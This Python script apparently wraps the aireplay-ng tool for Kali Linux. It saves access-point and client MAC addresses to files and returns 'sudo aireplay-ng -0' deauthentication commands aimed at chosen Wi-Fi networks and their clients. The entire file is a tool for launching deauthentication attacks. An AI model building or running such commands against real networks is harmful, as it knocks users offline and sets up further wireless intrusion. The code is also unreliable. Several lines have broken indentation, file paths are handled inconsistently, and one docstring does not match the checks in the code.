import os
from colorama import Fore,  Style

file_name_network = "saves_mac_network"
file_name_client = "saves_mac_client"
path = "/home/kali/"


#It receives text and stores it on a new line in the file_name
def saves_mac(mac,file_name):
    try:
        file = open(path+file_name,"a")
    except:
        file = open(path+file_name,"w")
        file.close()
        file = open(path+file_name,"a")
    file.write(mac+"\n")
    
    
# write everything in the file_name line by line
def print_mac(file_name):
    cpt = 0
    try:
        file = open(path+file_name,"r")
        print(Style.BRIGHT+Fore.BLUE+ file_name +"divice mac addr:"+Style.NORMAL+Fore.WHITE)
        for line in file:
            cpt += 1
            print(str(cpt)+") "+Style.BRIGHT+Fore.YELLOW+line.strip()+"\n"+Style.NORMAL+Fore.WHITE)
    except:print("<vide>")
 
    
"""This function receives a number, then searches 
the file_name on the line corresponding to this number and returns it"""
def shows_mac(num_mac, file_name):
    if num_mac > 100:
        try:
            with open(file_name, 'r') as file:
                lines = file.readlines()
                last_line = lines[-1].strip()
            return last_line
        except:open(file_name,'w');print(">vide<")
    else:
        liste_mac = []
        cpt = 0
        try:
            with open(file_name, "r") as file:
                for line in file:
                    cpt += 1
                    liste_mac.append(line.strip())
            return liste_mac[num_mac - 1]
        except Exception as e:
            print(f"An error occurred: {e}")
            return None

# Example usage
file_name = "saves_mac_network"
num_mac = 5
result = shows_mac(num_mac, file_name)
print(result)



"""This function takes two Macs from the Mac I study and num message
If Mac Study is found, the victim will return this text:sudo aireplay-ng -0 {num_send} -a {network_mac} -c {client_mac} wlan0mon
If it does not exist, this text will be returned:sudo aireplay-ng -0 {num_send} -a {network_mac} wlan0mon"""
def aireplay_ng(network_mac,client_mac,num_send):
    if len(network_mac)>15 and len(client_mac)>15:
        saves_mac(network_mac,file_name_network)
        saves_mac(client_mac,file_name_client)
        return f"sudo aireplay-ng -0 {num_send} -a {network_mac} -c {client_mac} wlan0mon"
            
    elif len(network_mac)>15 and len(client_mac)<15:
        saves_mac(network_mac,file_name_network)
        return f"sudo aireplay-ng -0 {num_send} -a {network_mac} wlan0mon"
    else:
        return"echo 'You did not enter the server's MAC'"


""" If the letter "p" is entered, this function will request a new input "input" and return this value.
If the entry is not made in either the network Mac or the user's Mac:/ sudo aireplay-ng -0 {num_send} -a {input_num_network} -c {input_num_client} wlan0mon
It will strengthen you to come back:/ aireplay_ng(network_mac, client_mac, num_send)"""
def enter_p(network_mac,client_mac,num_send):
    if network_mac == "p" or client_mac == "p":
        if network_mac == "p" and client_mac != "p":
            print_mac(file_name_network)
            input_num_network = input("shows: ")
            try:
                input_num_network = shows_mac(int(input_num_network),file_name_network)
            except:
                input_num_network = shows_mac(1,file_name_network)
            return f"sudo aireplay-ng -0 {num_send} -a {input_num_network} -c {client_mac} wlan0mon"
            
        if network_mac != "p" and client_mac == "p":
             print_mac(file_name_client)
            input_num_client = input("shows: ")
            try:
                input_num_client = shows_mac(int(input_num_client),file_name_client)
            except:
                input_num_client = shows_mac(1,file_name_client)
            return f"sudo aireplay-ng -0 {num_send} -a {network_mac} -c {input_num_client} wlan0mon"
            
        if network_mac == "p" and client_mac == "p":
            print_mac(file_name_network)
            input_num_network = input("shows: ")
            try:
                input_num_network = shows_mac(int(input_num_network),file_name_network)
            except:
                input_num_network = shows_mac(1,file_name_network)
                
            print_mac(file_name_client)
            input_num_client = input("shows: ")
            try:
                input_num_client = shows_mac(int(input_num_client),file_name_client)
            except:
                input_num_client = shows_mac(1,file_name_client)
                    
            return f"sudo aireplay-ng -0 {num_send} -a {input_num_network} -c {input_num_client} wlan0mon"
    else:
        return aireplay_ng(network_mac, client_mac, num_send)


"""If the letter "l" is entered, this function will 
enter the database file and extract the command line from the file:
sudo aireplay-ng -0 {num_send} -a {shows_mac(1,file_name_network)} -c {input_num_client} wlan0mon
If the entry is not made in either the network Mac or the user's Mac
You will come back: enter_p(network_mac,client_mac,num_send)"""
def last_mac(network_mac,client_mac,num_send):
     if network_mac == "l" or client_mac == "l":
        if network_mac == "l" and client_mac == "l":
            input_num_network = shows_mac(111,file_name_network)
            input_num_client = shows_mac(111,file_name_client)
            print(input_num_network)
            print(input_num_client)
            return f"sudo aireplay-ng -0 {num_send} -a {input_num_network} -c {input_num_client} wlan0mon"
         if network_mac == "l" and client_mac != "l":
            input_num_network = shows_mac(111,file_name_network)
            print(input_num_network)
            return enter_p(input_num_network,client_mac,num_send)
        if network_mac != "l" and client_mac == "l":
            input_num_client = shows_mac(111,file_name_client)
            print(input_num_client)
            return enter_p(network_mac,input_num_client,num_send)
    else:
        return enter_p(network_mac,client_mac,num_send)

    
"""If network_mac is "rm" or client_mac is "rc"
According to the entered value, the file responsible for 
storing one of them will delete all the elements inside it, and then return:
echo 'The file was deleted successfully'
If neither of the previous two options is entered, the function will return:
last_mac(network_mac,client_mac,num_send)"""
def remove_element_file(network_mac,client_mac,num_send):

    if network_mac == "rn" or client_mac == "rc":
        if network_mac == "rn":
            file = open(path+file_name_network,"w")
        if client_mac == "rc":
                file = open(path+file_name_client,"w")
        return "echo 'The file was deleted successfully'"
    else:
        return last_mac(network_mac,client_mac,num_send)



def main_aireplay_ng(network_mac, client_mac, num_send):
    return remove_element_file(network_mac, client_mac, num_send)



def text_color(text,color):
    try:
        return Style.BRIGHT + color + text + Style.NORMAL + Fore.WHITE 
        #color = Fore.color exp:Fore.RED
    except:
        return Style.NORMAL + Fore.WHITE + text
